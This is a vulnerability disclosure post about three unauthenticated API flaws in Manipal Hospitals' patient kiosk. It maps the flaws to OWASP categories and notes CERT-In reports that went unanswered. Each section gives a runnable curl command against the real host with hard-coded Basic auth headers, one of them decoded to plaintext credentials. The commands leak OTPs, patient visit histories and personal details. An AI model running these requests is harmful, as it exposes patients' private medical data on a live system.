---
title: Manipal Hospitals pvt ltd vulnerability 2024
date:
  created: 2025-08-14
  updated: 2025-09-12
---

The Manipal hospital pvt ltd has a mandatory registration process on its kiosk <https://kiosk.manipalhospitals.com>
for OPD consultations.
The portal collects a lot of information within minutes but the same personal data deletion takes 3-4 months.

The portal had numerous vulnerabilities that allowed to get the user's personal data in a serial access. One API provided the login OTP back to the person logging-in. In others, data was "protected" just by a static `Authorization` header exposed in the front-end code.

Summary of the vulnerabilities:

| Sr | API  | Date reported | Date fixed | Days taken | CERT-in reference number |
|----|------|---------------|------------|------------|--------------------------|
| 1  | [KioskOtpVerification](#1-kioskotpverification) | 27 December 2024 | Never reverted | more than 60 days | 91742724 |
| 2  | [PatientVisitHistory](#2-patientvisithistory) | 27 December 2024 | Never reverted | more than 60 days | 91742724 |
| 3  | [PatDetailsByMobileNo](#3-patdetailsbymobileno) | 27 December 2024 | Never reverted | more than 60 days | 91742724 |

Root cause in [OWASP](https://cheatsheetseries.owasp.org/index.html) terms:

- A01 2021 Broken Access Control: CWE-35 Path Traversal, CWE-284 Improper Access Control, CWE-285 Improper Authorization
- A02 2021 Cryptographic Failures: CWE-321 Use of Hard-coded Cryptographic Key
- A04 2021 Insecure Design: Insecure Direct Object Reference
- A07 2021 Identification and Authentication Failures: CWE-287 Improper Authentication, CWE-613 Insufficient Session Expiration

<!-- more -->

### 1. KioskOtpVerification

This API is used to send an OTP to the given phone number. This API defeated
the point of OTP verification by sending back the OTP in the API response.

```bash title="sample_script.sh" linenums="1"
timest=$(date '+%F_%T')
curl -v 'https://kiosk.manipalhospitals.com/ManipalKioskApi/api/OTP/KioskOtpVerification' -X POST -H \
'Authorization: Basic RW1wdWxzZURldjprXzNHNVtrKjF9NkBpMic=' \
--data-raw '{"mobileNumber":"91$$$$$$$$$$","hospitalCode":"MHJ"}' \
-o otp_exposed_$timest.json
```

???+ note "Sample Response"
    ```json linenums="1" hl_lines="3"
    ---8<--- "docs/vuln/posts/content_manipal/manipal_vuln_1.json"
    ```

### 2. PatientVisitHistory

This endpoint allowed serial access (increasing UHID) to a patient's visit history by relying on
a static `Authorization` header.

The header can be decoded to the following

```bash
echo RW1wdWxzZUhJUzonKTNRYz00MEk7PDdIdFdF | base64 -d
EmpulseHIS:')3Qc=40I;<7HtWE
```

```bash title="sample_script.sh" linenums="1"
timest=$(date '+%F_%T')
curl 'https://kiosk.manipalhospitals.com/ManipalDataSync/PatientVisitHistory' -X POST -H \
'Authorization: Basic RW1wdWxzZUhJUzonKTNRYz00MEk7PDdIdFdF' \
--data-raw '{"UHID":"MHXXXXXXXX7^01/01/2020^27/12/2024","hospitalCode":"MHB"}'  \
-o pat_vis_his_$timest.json
```

<details>
<summary>Sample Response</summary>
```json linenums="1"
---8<--- "docs/vuln/posts/content_manipal/manipal_vuln_2.json"
```
</details>

### 3. PatDetailsByMobileNo

This API accepted a phone number and provided the patient details like name, dob, email, gender etc.

The `Authorization` header is the same as in the above vulnerability.

```bash title="sample_script.sh" linenums="1"
timest=$(date '+%F_%T')
curl -v 'https://kiosk.manipalhospitals.com/ManipalDataSync/PatDetailsByMobileNo' -X POST -H \
'Authorization: Basic RW1wdWxzZUhJUzonKTNRYz00MEk7PDdIdFdF' \
 --data-raw '{"mobileno":"$$$$$$$$$$","locationCode":"MHJ"}' \
-o get_pat_by_mob_$timest.json
```

???+ note "Sample Response"
    ```json linenums="1"
    {
        "ErrorMessage": "null",
        "Message": "SUCCESS",
        "Status": "SUCCESS",
        "PatDetailResp": [
            {
            "Status": "Success",
            "Message": "Success",
            "HospNo": "MH$$$$$$$$7",
            "PatientName": "MR $$$$$$$$ ",
            "DOB": "$$/$$/$$$$",
            "Age": "$$ Yrs",
            "Sex": "$$$$$$$$",
            "MobileNo": "$$$$$$$$$$",
            "Email": "$$$$$$$$@$$$$$.$$$"
            }
        ]
    }
    ```
